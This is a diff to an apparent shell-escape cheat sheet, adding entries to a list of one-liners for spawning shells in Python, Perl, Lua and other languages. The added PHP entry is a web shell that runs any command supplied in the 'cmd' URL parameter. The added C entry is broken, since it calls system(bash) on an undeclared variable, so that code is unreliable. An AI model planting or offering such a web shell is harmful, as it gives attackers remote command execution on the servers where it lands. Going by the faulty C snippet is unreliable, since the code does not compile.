@@ -89,6 +89,14 @@ python -c ‘import pty;pty.spawn(“/bin/bash”);’
 exec("sh -i");
 ```
 
+## PHP Webshell:
+```
+<?php
+  $command = $_GET['cmd'];
+  echo system($command);
+?>
+```
+
 ## Perl:
 ```
 exec "/bin/sh";
@@ -102,4 +110,15 @@ exec "/bin/sh"
 ## Lua:
 ```
 os.execute("/bin/sh")
+```
+
+## C:
+```
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+	int status = system(bash);
+	return 0;
+}
 ```
